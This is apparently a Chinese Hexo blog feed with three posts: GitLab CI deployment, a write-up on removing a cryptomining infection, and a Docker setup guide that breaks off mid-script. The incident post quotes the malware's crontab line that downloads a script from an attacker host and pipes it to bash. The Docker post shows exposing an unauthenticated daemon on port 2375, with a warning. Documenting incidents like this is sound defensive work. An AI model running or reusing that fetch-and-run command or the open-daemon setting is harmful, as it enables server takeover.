src="/../blog-assets/Gitlab%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/20220607095216.png" alt="20220607095216"></p><blockquote><p><strong>2. 在项目根目录下编写<code>.gitlab-ci.yml</code> 脚本</strong> </p></blockquote><p>内容如下（第一次写，看不明白没关系，弄懂 <code>stage</code> ，<code>job</code> 的概念就行），后续会详细解析该脚本的配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment">## stages：通俗讲：就是将项目，从打包部署，分几个作业job，比如这里就分两个步骤，一个 build,打包编译， deploy：部署</span><br><span class="hljs-comment">## 在每个作业执行之前，有一些通用的执行操作，例如 SSH 认证配置、缓存等，放在 before_secript、cache 中</span><br><span class="hljs-comment"># image: node # 就是所依赖的环境 在 gitrunner-cli注册的时候，已经写了此处可以省略不写</span><br><span class="hljs-attr">stages:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">build</span>    <br>    <span class="hljs-bullet">-</span> <span class="hljs-string">deploy</span><br>     <br><span class="hljs-attr">before_script:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">echo</span> <span class="hljs-string">&quot;gitlab-ci start...&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">eval</span> <span class="hljs-string">`ssh-agent</span> <span class="hljs-string">-s`</span> <span class="hljs-comment"># 设置 SSH 免密登录</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">ssh-add</span> <span class="hljs-string">&lt;(echo</span> <span class="hljs-string">&quot;$SSH_KEY&quot;</span><span class="hljs-string">)</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">mkdir</span> <span class="hljs-string">-p</span> <span class="hljs-string">~/.ssh</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">chmod</span> <span class="hljs-number">700</span> <span class="hljs-string">~/.ssh</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">ssh-keyscan</span> <span class="hljs-string">部署服务器IP</span> <span class="hljs-string">&gt;</span> <span class="hljs-string">~/.ssh/known_hosts</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">chmod</span> <span class="hljs-number">644</span> <span class="hljs-string">~/.ssh/known_hosts</span> <br><span class="hljs-attr">build_job:</span><br>  <br>  <span class="hljs-attr">stage:</span> <span class="hljs-string">build</span>  <span class="hljs-comment"># 这一个stage：的值就是上面的 stages下的第一个 build</span><br>  <span class="hljs-attr">tags:</span> <span class="hljs-comment"># tag 在注册的时候，有提到过，分两步骤，第一个是 buil,所以这里也对应上，注册的时候是自定义的名称</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">build</span><br>  <span class="hljs-attr">script:</span> <span class="hljs-comment"># 这个就是操作命令 或者写脚本路径</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">npm</span> <span class="hljs-string">install</span> <span class="hljs-string">-g</span> <span class="hljs-string">cnpm</span> <span class="hljs-string">--registry=https://registry.npm.taobao.org</span> <span class="hljs-comment">#切换至cnpm，提升速度</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">echo</span> <span class="hljs-string">`pwd`</span> <span class="hljs-comment"># 输出当前路径</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">cnpm</span> <span class="hljs-string">install</span> <span class="hljs-string">-g</span> <span class="hljs-string">hexo-cli</span>  <span class="hljs-comment"># 安装 hexo-cli</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">cnpm</span> <span class="hljs-string">install</span> <br>  <span class="hljs-bullet">-</span> <span class="hljs-string">hexo</span> <span class="hljs-string">clean</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">hexo</span> <span class="hljs-string">g</span> <span class="hljs-comment"># 打包生成 public 文件夹</span><br> <br><span class="hljs-comment"># 缓存，因为是容器执行，每次执行的时候都会重新打包，缓存起来就不需要再次安装一次  </span><br><span class="hljs-attr">cache:</span><br>  <span class="hljs-attr">paths:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">node_modules/</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">public/</span>  <br><br><span class="hljs-comment"># 第二个任务 就是专业词语 job ,第一个是先 build ,这个跟上面的build一样名称自定义</span><br><span class="hljs-attr">deploy_job:</span><br>     <span class="hljs-attr">stage:</span> <span class="hljs-string">deploy</span>  <span class="hljs-comment"># 这一个stage：的值就是上面的 stages下的第一个 deploy</span><br>     <span class="hljs-attr">tags:</span><br>       <span class="hljs-bullet">-</span> <span class="hljs-string">deploy</span> <span class="hljs-comment"># tag 在注册的时候，有提到过，分两步骤，第二个个是 deploy,所以这里也对应上，注册的时候是自定义的名称</span><br>     <span class="hljs-attr">script:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">pwd</span> <span class="hljs-comment">#  也输出下路径</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">mv</span> <span class="hljs-string">public</span> <span class="hljs-string">html</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">ls</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">scp</span> <span class="hljs-string">-r</span> <span class="hljs-string">./html/</span> <span class="hljs-string">root@部署服务器IP:/opt/docker/nginx</span>  <span class="hljs-comment"># 将打包好的文件上到发布项目的服务器中的。放到nginx能访问到的文件夹下</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">echo</span> <span class="hljs-string">&quot;gitlab-ci success.&quot;</span><br></code></pre></td></tr></table></figure><p>脚本编写完成后，可以将内容放到 <code>GitLab</code> 进行语法检测，看能否正确识别出各个步骤操作</p><p><img src="/../blog-assets/Gitlab%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/1654581145899.png" alt="1654581145899"></p><blockquote><p><strong>3. 设置SSH免密登录</strong></p></blockquote><p>上述脚本中使用了一个变量 <code>SSH_KEY</code> ，该变量为 <code>gitlab-runner</code> 服务器的 <code>ssh私钥</code> 信息。</p><p>这里简单解释一下，我们知道 <code>git-runner</code> 要使用 SSH 登录项目部署的服务器，需要创建一对公私钥，将其公钥添加到 <code>部署服务器</code> 的 ssh 公钥配置中，登录时再通过私钥去做验证</p><ul><li>参考： <a href="https://blog.csdn.net/weixin_46232508/article/details/106397322">Linux - 配置SSH免密登入</a></li></ul><p>因此我们在 <code>gitlab-runner</code> 安装的服务器上，输入如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 生成公私钥</span><br>ssh-keygen -t rsa -C <span class="hljs-string">&quot;niceday@163.com&quot;</span><br></code></pre></td></tr></table></figure><ul><li>将 <code>~/.ssh</code> 目录下的公钥 <code>id_rsa.pub</code> 的内容添加至 部署项目的服务器 <code>~/.ssh/anthorized_keys</code> 中</li><li>将目录下私钥 <code>id_rsa</code> 的内容添加至变量 <code>SSH_KEY</code> 中</li></ul><p><img src="/../blog-assets/Gitlab%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/1654583291460.png" alt="1654583291460"></p><blockquote><p><strong>4. push 脚本到 Gitlab</strong></p></blockquote><p>验证无误后，就将 <code>.gitlab-ci.yml</code> 脚本 push 到远程仓库，在<code>GitLab—项目—CI/CD</code> 下就可以查看自动化作业执行的情况了</p><p><img src="/../blog-assets/Gitlab%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/1654581464922.png" alt="1654581464922"></p><p>点击每个作业步，也可以查看具体的命令执行信息</p><p><img src="/../blog-assets/Gitlab%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/1654581569487.png" alt="1654581569487"></p><blockquote><p><strong>5. 验证执行结果</strong></p></blockquote><p>流水线显示执行成功后，可通过浏览器验证内容是否更新，也可上服务器看文件是否更新</p><p><img src="/../blog-assets/Gitlab%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/1654584003746.png" alt="1654584003746"></p><p><strong>至此，大功告成！</strong></p><h1 id="将-GitLab-提交同步至-Github"><a href="#将-GitLab-提交同步至-Github" class="headerlink" title="将 GitLab 提交同步至 Github"></a>将 GitLab 提交同步至 Github</h1><ul><li>参考： <a href="https://www.cnblogs.com/sxdcgaq8080/p/10530176.html">GitLab和GitHub的双向同步</a> </li><li>提高 <code>Github</code> 访问速度： <a href="https://blog.csdn.net/wplblog/article/details/120967043?utm_medium=distribute.pc_feed_404.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-120967043-blog-null.pc_404_mixedpudn&depth_1-utm_source=distribute.pc_feed_404.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-120967043-blog-null.pc_404_mixedpud">github域名解析优化</a></li></ul><blockquote><ol><li>在 <code>github</code> 上创建一个 <code>token</code></li></ol></blockquote><p>登录 Github，找到 <code>settings - Developer settings - Personal access tokens</code> 设置，创建包含<code>repo</code> 权限的新<code>token</code> ，生成的 <code>token</code> 记录下来，网站不会保存</p><p><img src="/../blog-assets/Gitlab%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/1654590060334.png" alt="1654590060334"></p><blockquote><ol start="2"><li>获取要同步的 Github 库</li></ol></blockquote><p>在 Github 上找到要同步的项目库，获取版本库链接</p><p><img src="/../blog-assets/Gitlab%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/1654590334074.png" alt="1654590334074"></p><p>将该链接内容改动如下，在<code>github.com</code>前拼接 <code>用户名:步骤1的token@</code> </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://你的用户名:你的token@github.com/DunkingCurry30/DunkingCurry30.github.io.git<br></code></pre></td></tr></table></figure><blockquote><ol start="3"><li>Gitlab配置Github库</li></ol></blockquote><p>登录 Gitlab，选择要同步的项目 <code>设置 - 仓库 - 推送到远程仓库 </code> ，填写上面得到的链接后保存修改</p><p><img src="/../blog-assets/Gitlab%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/1654591468606.png" alt="1654591468606"></p><p>点击 <code>现在更新</code> 立即进行同步，更新成功后查看 github，成功同步</p><p><img src="/../blog-assets/Gitlab%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/1654591646389.png" alt="1654591646389"></p><blockquote><p>至此，结合 <a href="/2022/06/07/%E5%9F%BA%E4%BA%8EGithub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">基于Hexo的个人博客搭建</a> 可实现通过本地提交代码至 <code>Gitlab</code> 同时触发以下自动化流程 </p><ul><li><code>Gitlab CI</code> 自动部署至云服务器</li><li><code>Gitlab</code> 提交同步 <code>Github</code> 自动部署至 <code>Github Pages</code></li></ul></blockquote>]]></content>
    
    
    <categories>
      
      <category>DevOps</category>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>gitlab</tag>
      
      <tag>ssh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pnscan挖矿病毒排查过程记录</title>
    <link href="/2022/06/08/pnscan%E7%97%85%E6%AF%92%E6%8E%92%E6%9F%A5/"/>
    <url>/2022/06/08/pnscan%E7%97%85%E6%AF%92%E6%8E%92%E6%9F%A5/</url>
    
    <content type="html"><![CDATA[<blockquote><p>记一次服务器被挖矿病毒攻击问题排查</p></blockquote><ul><li><p>原因：因为docker远程连接，开放了默认端口2375，导致中了挖矿病毒kdevtmpfsi，pnscan</p></li><li><p>现象：CPU占用拉满，定时任务向6379端口持续发送信息</p></li></ul><ol><li><p>首先想到使用top命令排查进程，发现top无法使用，显示<code>permission denied</code> ，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@VM-16-4-centos bin]# top<br>-bash: /usr/bin/top: Permission denied<br></code></pre></td></tr></table></figure></li><li><p>查询后获悉<code>top</code> 命令被篡改为如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@VM-16-4-centos bin]# cat /usr/bin/top<br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br>top.lanigiro $@ | grep -v &#x27;ddns\|scan&#x27;<br></code></pre></td></tr></table></figure></li><li><p>拷贝原有top脚本，通过ftp传输，发现无法覆盖<code>top</code> 文件，使用 <code>lsattr</code> 命令查看文件属性，果然为被设置为了 <code>-i</code>  不可修改：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@VM-16-4-centos bin]# lsattr /usr/bin/top<br>----i--------e-- /usr/bin/top<br></code></pre></td></tr></table></figure></li><li><p>打算使用<code>chattr</code> 命令删除<code>-i</code> 参数，发现<code>chattr</code> 命令不可用，也被删除掉了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@VM-16-4-centos bin]# chattr<br>-bash: chattr: command not found<br></code></pre></td></tr></table></figure></li><li><p>只能重新安装<code>chattr</code> 命令，查看安装包版本，先删除再安装<code>e2fsprogs</code> 包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@VM-16-4-centos bin]# rpm -qa|grep e2fsprogs<br>e2fsprogs-libs-1.42.9-19.el7.x86_64<br>e2fsprogs-1.42.9-19.el7.x86_64<br>[root@VM-16-4-centos bin]# yum remove e2fsprogs-1.42.9-19.el7.x86_64<br>[root@VM-16-4-centos bin]# yum install e2fsprogs-1.42.9-19.el7.x86_64<br></code></pre></td></tr></table></figure></li><li><p>重装后<code>chattr</code> 命令终于可用，修改文件属性，使用FTP工具传输覆盖<code>top</code> 命令，仍然无法使用top命令，于是改安装<code>htop</code> 命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">yum -y install htop<br></code></pre></td></tr></table></figure></li><li><p>使用<code>htop</code> 命令查看，发现挖矿病毒，继续排查</p></li></ol><p><img src="/../blog-assets/pnscan%E7%97%85%E6%AF%92%E6%8E%92%E6%9F%A5/1654084303957.png" alt="1654084303957"></p><ol start="8"><li><p>查看定时任务，并停止，发现cron脚本也被感染无法更改（心肺停止…）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@VM-16-4-centos bin]# crontab -l<br>*/30 * * * * /usr/bin/cdz -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | bash &gt; /dev/null 2&gt;&amp;1<br><br>[root@VM-16-4-centos bin]# crontab -e<br><br>*/30 * * * * /usr/bin/cdz -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | bash &gt; /dev/null 2&gt;&amp;1<br><br></code></pre></td></tr></table></figure></li><li><p>修改<code>cron</code> 文件属性，修改后删除定时任务，再使用<code>htop</code> 命令查看，CPU占用明显降低，仅剩  <strong>pnscan</strong> 病毒</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@VM-16-4-centos bin]# chattr -iae /var/spool/cron/root <br>[root@VM-16-4-centos bin]# lsattr /var/spool/cron/<br>-------------e-- /var/spool/cron/root<br>[root@VM-16-4-centos bin]# crontab -e<br>crontab: installing new crontab<br><br></code></pre></td></tr></table></figure></li><li><p>但修改后仍然无法删除定时任务脚本只能编辑，原来可能存在隐藏文件，<code>lsattr -a</code> 命令查看果然有，同样<code>chattr</code> 修改对应文件属性</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@VM-12-14-centos cron]# lsattr -a<br>----ia-------e-- ./.<br>-------------e-- ./..<br>---------------- ./root<br>[root@VM-12-14-centos cron]# chattr -iae .<br>[root@VM-12-14-centos cron]# chattr -iae ..<br>[root@VM-12-14-centos cron]# lsattr -a<br>---------------- ./.<br>---------------- ./..<br>----------------./root<br></code></pre></td></tr></table></figure></li><li><p>去除pnscan，用htop命令查看 pnscan进程位置，删除对应文件，至此pnscan病毒搞定</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@VM-12-14-centos bin]# rm -f pnscan<br></code></pre></td></tr></table></figure></li><li><p>终于发现被攻击原因，因为docker远程连接，开放了默认端口2375，导致中了挖矿病毒，具体原因分析如下：</p></li></ol><ul><li><p>docker开放2375端口用于远程管理容器，而容器本身可以挂载服务器目录；</p></li><li><p>因此攻击者通过2375端口，拉取做好的镜像，启动容器时挂载<code>~/.ssh</code> 目录 在 <code>authorized_keys</code> 中添加了攻击者的公钥，至此，攻击者获得服务器控制权，进而执行病毒脚本。</p></li><li><p>参考：<a href="https://www.techug.com/post/do-a-hacker-invade-a-server.html">https://www.techug.com/post/do-a-hacker-invade-a-server.html</a></p></li></ul><blockquote><p>后记：外网环境应通过<code>TLS</code>方式开启docker远程端口访问，配置细节可参考 <a href="/2022/06/06/docker%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/">docker环境及常用镜像安装</a>  </p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>ssh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker 环境及常用镜像安装</title>
    <link href="/2022/06/07/docker%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"/>
    <url>/2022/06/07/docker%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h1 id="docker环境安装"><a href="#docker环境安装" class="headerlink" title="docker环境安装"></a>docker环境安装</h1><blockquote><p><a href="https://so.csdn.net/so/search?q=Docker&spm=1001.2101.3001.7020">Docker</a> 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中,然后发布到任何流行的Linux机器或Windows 机器上,也可以实现虚拟化,容器是完全使用沙箱机制,相互之间不会有任何接口。 </p></blockquote><ul><li><p>参考： <a href="https://blog.csdn.net/qq_26400011/article/details/113856681?ops_request_misc=%7B%22request_id%22:%22165398523016781435481764%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=165398523016781435481764&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-113856681-null-null.142%5Ev11%5Epc_search_result_control_group,157%5Ev12%5Econtrol&utm_term=docker%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4187">Centos7安装Docker</a> </p></li><li><p>服务器环境：CentOS 7.6</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 更新yum</span><br>yum update<br><span class="hljs-comment"># 安装yum-utils工具</span><br>yum install -y yum-utils<br><span class="hljs-comment">#安装htop</span><br>yum -y install htop<br><span class="hljs-comment">#安装tree命令</span><br>yum -y install tree<br><span class="hljs-comment">#设置阿里云镜像仓库地址</span><br>yum-config-manager \<br>   --add-repo \<br>   http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<br><br><span class="hljs-comment"># 更新yum软件包索引</span><br>yum makecache fase <br><span class="hljs-comment"># 安装 docker（这里安装docker-ce版本）</span><br>yum install docker-ce docker-ce-cli containerd.io<br><br><span class="hljs-comment"># 配置阿里云镜像加速器</span><br><span class="hljs-built_in">mkdir</span> -p /etc/docker<br><span class="hljs-comment"># 配置镜像加速地址(需至阿里云平台——容器服务申请)</span><br><span class="hljs-built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="hljs-string">&#x27;EOF&#x27;</span><br>&#123;<br><span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<span class="hljs-string">&quot;https://xxxxxxx.mirror.aliyuncs.com&quot;</span>]<br>&#125;<br>EOF<br><br><span class="hljs-comment"># 重启docker</span><br>systemctl daemon-reload<br>systemctl restart docker<br><br><span class="hljs-comment"># 设置开机启动docker</span><br>systemctl <span class="hljs-built_in">enable</span> docker<br><br><br></code></pre></td></tr></table></figure><h1 id="docker常用命令"><a href="#docker常用命令" class="headerlink" title="docker常用命令"></a>docker常用命令</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/06a539a30efc11ba47aa2767e15ce912.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 构建镜像</span><br>docker build -t 镜像名称<br><span class="hljs-comment"># 加载镜像tar包</span><br>docker load -i xxx.tar<br><span class="hljs-comment"># 删除镜像</span><br>docker rmi [-f] 镜像名称或ID <br>  -f, --force          强制删除<br><span class="hljs-comment"># 保存镜像</span><br>docker save hello-world:latest -o /home/docker/images/hello-world.tar<br><span class="hljs-comment"># 启停容器</span><br>docker run -d --name 容器名称 -p 8080:80 镜像名称<br>docker start 镜像名称<br>docker stop 镜像名称<br><span class="hljs-comment"># 查看容器中的进程</span><br>docker top 镜像名称<br><span class="hljs-comment"># 查看容器元数据</span><br>docker inspect 镜像名称<br><span class="hljs-comment"># 从容器内拷贝文件到主机</span><br>docker <span class="hljs-built_in">cp</span> 容器<span class="hljs-built_in">id</span>:容器内路径 目的主机路径<br><span class="hljs-comment"># 查看容器日志</span><br>docker logs [可选参数] 容器ID<br>      --details        显示提供给日志的其他详细信息<br>  -f, --follow         跟踪日志输出<br>  -n, --<span class="hljs-built_in">tail</span> string    指定要显示的日志条数 (默认为全部)<br>  -t, --timestamps     显示时间戳<br><span class="hljs-comment"># 删除容器</span><br>docker <span class="hljs-built_in">rm</span> 镜像名称<br><span class="hljs-comment"># 进入容器</span><br>docker <span class="hljs-built_in">exec</span> -it 容器名称 容器命令行<br><span class="hljs-comment"># 退出容器</span><br><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><h1 id="docker安装Portainer"><a href="#docker安装Portainer" class="headerlink" title="docker安装Portainer"></a>docker安装Portainer</h1><blockquote><p>Portainer是一个可视化的容器镜像的图形管理工具，利用Portainer可以轻松构建，管理和维护Docker环境。 而且完全免费，基于容器化的安装方式，方便高效部署。 </p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 获取portainer-ce镜像</span><br>docker search portainer<br>docker pull portainer/portainer-ce<br><span class="hljs-comment"># 创建volume做持久化</span><br>docker volume create portainer_data<br><span class="hljs-comment"># 启动</span><br>docker run -d -p 9000:9000 --restart=always --name=portainer \<br>  -v /var/run/docker.sock:/var/run/docker.sock \<br>  -v portainer_data:/data \<br>  portainer/portainer-ce<br><br><span class="hljs-comment"># 查看容器状态，通过 ip:9000 访问web页面</span><br>docker ps -a<br><br><span class="hljs-comment"># 允许远程连接docker，这里配置docker端口为2375，同步需要打开防火墙</span><br><span class="hljs-comment"># ！！！！注意：此方式仅适用于内网环境，生产环境请使用TLS连接，否则直接docker暴露2375端口，极易被挖矿病毒攻击</span><br>vim /usr/lib/systemd/system/docker.service<br><span class="hljs-comment"># 找到以下行，修改为</span><br>ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix://var/run/docker.sock --containerd=/run/containerd/containerd.sock<br><span class="hljs-comment"># 重启docker</span><br>systemctl daemon-reload<br>systemctl restart docker<br></code></pre></td></tr></table></figure><h1 id="docker开启远程安全访问（TLS）"><a href="#docker开启远程安全访问（TLS）" class="headerlink" title="docker开启远程安全访问（TLS）"></a>docker开启远程安全访问（TLS）</h1><p>通过<code>TLS</code>方式远程安全访问docker，这里配置docker端口为<code>2375</code>，同步需要打开防火墙</p><p>首先，创建一个ca文件夹存放公钥和私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /usr/local/userSh<br><span class="hljs-built_in">cd</span> /usr/local/userSh<br><span class="hljs-built_in">touch</span> tls.sh<br>vi tls.sh<br></code></pre></td></tr></table></figure><p>将下列脚本内容复制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment">#相关配置信息（除IP有用，其他基本咩有用）</span><br><span class="hljs-comment">#服务器IP或者域名</span><br>SERVER=<span class="hljs-string">&quot;服务器ip&quot;</span><br>PASSWORD=<span class="hljs-string">&quot;nicetry&quot;</span><br>COUNTRY=<span class="hljs-string">&quot;CN&quot;</span><br>STATE=<span class="hljs-string">&quot;Sichuan&quot;</span><br>CITY=<span 